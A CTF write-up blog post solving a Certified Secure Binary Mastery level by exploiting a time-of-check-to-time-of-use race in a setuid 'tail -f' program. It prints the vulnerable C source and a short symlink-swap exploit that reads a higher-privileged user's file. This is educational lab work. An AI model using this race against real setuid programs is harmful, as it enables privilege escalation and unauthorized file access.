---
title:  "[CTF] Binary Master Lieutenant - 4"
categories: [CTF, Binary-Master]
---

![Logo](/assets/images/belts-black.png)


We're finally getting closer to the end of the [Lieutenant](https://www.certifiedsecure.com/certification/view/37) set of challenges from **Certified Secure Binary Mastery**. This time we'll analyse another classic vulnerability - **Time of check to time of use (TOCTOU)**. At its root, the vulnerability is a class of [race condition](https://en.wikipedia.org/wiki/Race_condition). 

<blockquote>
	<p><b>TOCTOU</b>, pronounced "TOCK too" is a class of software bug caused by changes in a system between the checking of a condition (such as a security credential) and the use of the results of that check.</p>
  <cite><a target="_blank" href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">TOCTTOU - Wikipedia</a>
</cite> </blockquote>

The vulnerability in this level is actually pretty straight-forward to spot. Although race-conditions are usually difficult to exploit reliably, in this case things are easier, as we'll see.

To review the previous levels, check the links below:
* [Binary Master: Ensign - Level 1]({{ site.baseurl }}{% post_url 2016-01-07-binary-master-ensign-1 %})
* [Binary Master: Ensign - Level 2]({{ site.baseurl }}{% post_url 2016-01-14-binary-master-ensign-2 %})
* [Binary Master: Ensign - Level 3]({{ site.baseurl }}{% post_url 2016-01-21-binary-master-ensign-3 %})
* [Binary Master: Ensign - Level 4]({{ site.baseurl }}{% post_url 2016-01-28-binary-master-ensign-4 %})
* [Binary Master: Ensign - Level 5]({{ site.baseurl }}{% post_url 2016-02-09-binary-master-ensign-5 %})
* [Binary Master: Lieutenant - Level 1]({{ site.baseurl }}{% post_url 2016-02-16-binary-master-lieutenant-1 %})
* [Binary Master: Lieutenant - Level 2]({{ site.baseurl }}{% post_url 2016-02-23-binary-master-lieutenant-2 %})
* [Binary Master: Lieutenant - Level 3]({{ site.baseurl }}{% post_url 2016-03-02-binary-master-lieutenant-3 %})

## 0 - Discovery

Let's see what mitigation techniques we have here, if any, using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally:

```bash
$ checksec.sh --file level4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   level4
```
So both **NX bit** and **stack canary** are enabled. Sounds difficult to exploit but let's not worry just yet and have a look at the source code:

```c
/*
 * Nice replacement for 'tail -f'.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char** argv) {
	FILE* fp;
	char ch;
	int pos = 0;
	int len = 0;

	if (argc != 2) {
		printf("Usage: %s <file>\n", argv[0]);

		return -1;
	}
	
[1]	seteuid(getuid());                                                 
	fp = fopen(argv[1], "r");
	
	if (fp == NULL) {
		char error[50];
		snprintf(error, 49, "Error opening file %s\n", argv[1]);
		fprintf(stderr, "%s", error);       
 
		return -1;
	}
	
	fclose(fp);
[2]	seteuid(1006);    
	
	for (;;) {
[3]		fp = fopen(argv[1], "rb");

		if (fp == NULL) {
			return -1;
		}

		fseek(fp, 0, SEEK_END);
		len = ftell(fp);
	
		fseek(fp, pos, SEEK_SET);

		while (pos < len) {
			ch = fgetc(fp);
			pos++;
			printf("%c", ch);
		}

		fclose(fp);
		sleep(1);
	}

	return 0;
}
```

First, a bit about the functionality of the application:
* The code at **[1]** _sets the effective user id_ to the actual user id running the process. The effective user id is what the OS checks when making a decision whether to allow an operation or not. To understand more about real and effective user ids, check [this link](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id#32456814). 
* Basically this call will drop the privileges temporarily (remember we have a setuid program) to check if the real user has privileges to open a file or not.
*  The _seteuid()_ call at **[2]** then restores the privileges by setting the effective user id to 1006 (level5), which is the actual owner of the binary:

```
$ id
uid=1005(level4) gid=1005(level4) groups=1005(level4)
$ ls -alh /levels/level4
-rwsr-s--- 1 level5 level4 7.7K May 12 12:36 /levels/level4
```

## 1 - Vulnerability

Although the program will check if the real user has privileges to open the file specified as first parameter,
another _fopen()_ call is performed at **[3]** without any verification, basically introducing the TOCTOU vulnerability. So in order to exploit this we'll do a few simple stes:
* Create a file in the /tmp folder, for which the application will have access.
* While the application is in the _for_ loop waiting for modifications on the file, replace it with a symbolic link to /home/level5/victory. At this point the level5 privileges have been regained so we'll have read access.

## 2 - Exploit 

As said before, exploiting this is very straight-forward:

```
$ echo 123 > /tmp/file
$ /levels/level4 /tmp/file &
[1] 11482
$ ln -fs /home/level5/victory /tmp/file
```

## 3 - Profit

```

  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                              /___/  
                ___           __                   __   
               / (_)___ __ __/ /____ ___ ___ ____ / /_  
              / / // -_) // / __/ -_) _ | _ `/ _ | __/  
             /_/_/ \__/\_,_/\__/\__/_//_|_,_/_//_|__/   
             
Subject: Victory!

Congrats, you have solved level4. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level4 @ binary mastery lieutenant)
   * the exploit 
   
You can now start with level5. If you want, you can log in
as level5 with password   [REDACTED]
```

That's it for now. The [final level]({{ site.baseurl }}{% post_url 2016-03-17-binary-master-lieutenant-5 %}) which we'll see next was the most interesting for me. We'll perform a Man-in-the-Middle attack on a well-known cryptographic encryption scheme.

